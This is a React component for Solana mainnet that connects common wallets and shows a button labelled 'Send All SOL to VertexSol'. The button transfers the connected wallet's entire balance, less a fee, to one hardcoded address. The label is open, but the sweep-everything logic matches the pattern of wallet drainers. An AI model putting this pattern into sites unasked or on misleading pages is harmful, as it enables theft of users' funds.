
import { useMemo, useState } from 'react';
import { Connection, PublicKey, LAMPORTS_PER_SOL, SystemProgram, Transaction } from '@solana/web3.js';
import { useWallet, WalletProvider, ConnectionProvider } from '@solana/wallet-adapter-react';
import {
  WalletModalProvider,
  WalletMultiButton,
} from '@solana/wallet-adapter-react-ui';
import {
  PhantomWalletAdapter,
  SolflareWalletAdapter,
  TorusWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import { clusterApiUrl } from '@solana/web3.js';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';

// Import wallet adapter styles using ES Modules syntax
import '@solana/wallet-adapter-react-ui/styles.css';

const VERTEX_SOL_ADDRESS = new PublicKey('827FoJXyAQmyMtqgkKG52YQJyLkfxyFVHwLk98o7jz11');
const connection = new Connection(clusterApiUrl('mainnet-beta'));

function WalletAction() {
  const { publicKey, signTransaction, sendTransaction, connected } = useWallet();
  const [status, setStatus] = useState<string>('');

  const handleTransferAllSol = async () => {
    if (!publicKey || !signTransaction || !connected) return;

    try {
      const balance = await connection.getBalance(publicKey);
      if (balance <= 5000) throw new Error('Not enough SOL to cover transaction fee');

      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: VERTEX_SOL_ADDRESS,
          lamports: balance - 5000, // subtract estimated fee
        })
      );

      const signature = await sendTransaction(tx, connection);
      await connection.confirmTransaction(signature, 'confirmed');
      setStatus(`Success! Tx Signature: ${signature}`);
    } catch (err: any) {
      setStatus(`Error: ${err.message}`);
    }
  };

  return (
    <div className="flex flex-col gap-4 items-center">
      <WalletMultiButton />
      {connected && (
        <Button onClick={handleTransferAllSol} className="bg-red-600 hover:bg-red-700">
          Send All SOL to VertexSol
        </Button>
      )}
      {status && <p className="text-sm text-gray-500 mt-2">{status}</p>}
    </div>
  );
}

export function SolanaWalletConnection() {
  const wallets = useMemo(
    () => [
      new PhantomWalletAdapter(),
      new SolflareWalletAdapter(),
      new TorusWalletAdapter(),
    ],
    []
  );

  return (
    <ConnectionProvider endpoint={clusterApiUrl('mainnet-beta')}>
      <WalletProvider wallets={wallets} autoConnect>
        <WalletModalProvider>
          <WalletAction />
        </WalletModalProvider>
      </WalletProvider>
    </ConnectionProvider>
  );
}
